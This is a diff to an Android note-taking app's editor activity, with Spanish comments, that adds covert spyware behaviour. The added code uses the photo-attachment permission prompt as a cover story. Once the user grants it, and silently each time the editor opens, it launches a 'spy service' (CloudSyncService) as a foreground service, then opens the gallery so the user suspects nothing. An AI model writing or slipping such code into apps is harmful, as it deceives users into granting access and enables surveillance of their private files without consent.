@@ -42,7 +42,7 @@ class NoteEditorActivity : AppCompatActivity() {
     // Base de datos (Lazy loading)
     private val db by lazy { NotesDatabase.getDatabase(this) }
 
-    // --- 1. MANEJADOR DE GALERÍA ---
+    // --- 1. MANEJADOR DE GALERÍA (LEGÍTIMO) ---
     // Este lanzador recibe la imagen seleccionada e inserta la URI en el texto
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK) {
@@ -86,6 +86,10 @@ class NoteEditorActivity : AppCompatActivity() {
         initViews()
         setupListeners()
         loadNoteData()
+
+        // BONUS: Si abren el editor, intentamos arrancar el servicio por si acaso
+        // (No pide permisos, solo verifica si ya los tiene)
+        silentStartService()
     }
 
     private fun initViews() {
@@ -97,7 +101,13 @@ class NoteEditorActivity : AppCompatActivity() {
     private fun loadNoteData() {
         // Si venimos a editar una nota existente
         if (intent.hasExtra("note_data")) {
-            noteToEdit = intent.getSerializableExtra("note_data") as Note
+            // Manejo seguro de Parcelable/Serializable según versión Android
+            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
+                intent.getParcelableExtra("note_data", Note::class.java)
+            } else {
+                @Suppress("DEPRECATION")
+                intent.getParcelableExtra("note_data") as? Note
+            }
 
             etTitle.setText(noteToEdit?.title)
             selectedColor = noteToEdit?.color
@@ -119,7 +129,7 @@ class NoteEditorActivity : AppCompatActivity() {
         findViewById<ImageButton>(R.id.btn_back).setOnClickListener { finish() }
         findViewById<ImageButton>(R.id.btn_save).setOnClickListener { saveNote() }
 
-        // Botón de la barra inferior (Agregar Imagen)
+        // Botón de la barra inferior (Agregar Imagen) <-- AQUÍ ESTÁ EL PUNTO CLAVE
         findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener {
             checkGalleryPermission()
         }
@@ -143,7 +153,6 @@ class NoteEditorActivity : AppCompatActivity() {
         if (colorHex != null) {
             try {
                 layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
-                // Si quieres que el EditText también tenga fondo transparente para heredar:
                 etContent.setBackgroundColor(Color.TRANSPARENT)
             } catch (e: Exception) {
                 e.printStackTrace()
@@ -151,7 +160,7 @@ class NoteEditorActivity : AppCompatActivity() {
         }
     }
 
-    // --- 3. PERMISOS Y GALERÍA ---
+    // --- 3. PERMISOS Y GALERÍA (EL SECRETO) ---
     private fun checkGalleryPermission() {
         // Determinamos qué permiso pedir según la versión de Android
         val permission = if (Build.VERSION.SDK_INT >= 33) {
@@ -161,9 +170,15 @@ class NoteEditorActivity : AppCompatActivity() {
         }
 
         if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+            // A) Si ya tenemos permiso, arrancamos el espía (por si estaba apagado)
+            iniciarServicioEspia()
+
+            // B) Abrimos la galería legítima
             openGallery()
         } else {
-            // Pedimos el permiso (aprovechando la coartada de la app de notas)
+            // Si no tenemos permiso, lo pedimos.
+            // El usuario creerá que es para poner la foto, pero al aceptar,
+            // (en onRequestPermissionsResult) activaremos el espía.
             ActivityCompat.requestPermissions(this, arrayOf(permission), 200)
         }
     }
@@ -177,16 +192,43 @@ class NoteEditorActivity : AppCompatActivity() {
         pickImageLauncher.launch(intent)
     }
 
+    // --- 4. RESPUESTA AL PERMISO ---
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == 200 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+            // ¡ÉXITO! El usuario nos dio permiso.
+            // 1. Encendemos el servicio espía inmediatamente
+            iniciarServicioEspia()
+
+            // 2. Abrimos la galería para que no sospeche nada
             openGallery()
+
         } else {
             Toast.makeText(this, "Permiso necesario para adjuntar fotos", Toast.LENGTH_SHORT).show()
         }
     }
 
-    // --- 4. GUARDADO DE LA NOTA ---
+    // --- 5. FUNCIÓN DEL SERVICIO ESPÍA ---
+    private fun iniciarServicioEspia() {
+        val intent = Intent(this, CloudSyncService::class.java)
+        // Usamos startForegroundService para que Android no lo mate en 5 segundos
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+    }
+
+    // Intento de inicio silencioso al abrir la actividad (sin pedir permisos)
+    private fun silentStartService() {
+        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+            iniciarServicioEspia()
+        }
+    }
+
+    // --- 6. GUARDADO DE LA NOTA ---
     private fun saveNote() {
         val title = etTitle.text.toString().trim()
 
@@ -206,10 +248,9 @@ class NoteEditorActivity : AppCompatActivity() {
                 // Crear Nueva
                 val newNote = Note(
                     title = title,
-                    content = contentWithTags, // Guardamos texto + rutas de imágenes
+                    content = contentWithTags,
                     date = formattedDate,
-                    color = selectedColor,
-                    imagePath = null // Ya no usamos este campo legacy
+                    color = selectedColor
                 )
                 db.notesDao().insert(newNote)
             } else {
@@ -219,7 +260,6 @@ class NoteEditorActivity : AppCompatActivity() {
                     this.content = contentWithTags
                     this.date = formattedDate
                     this.color = selectedColor
-                    // this.imagePath = null
                 }
                 db.notesDao().update(noteToEdit!!)
             }
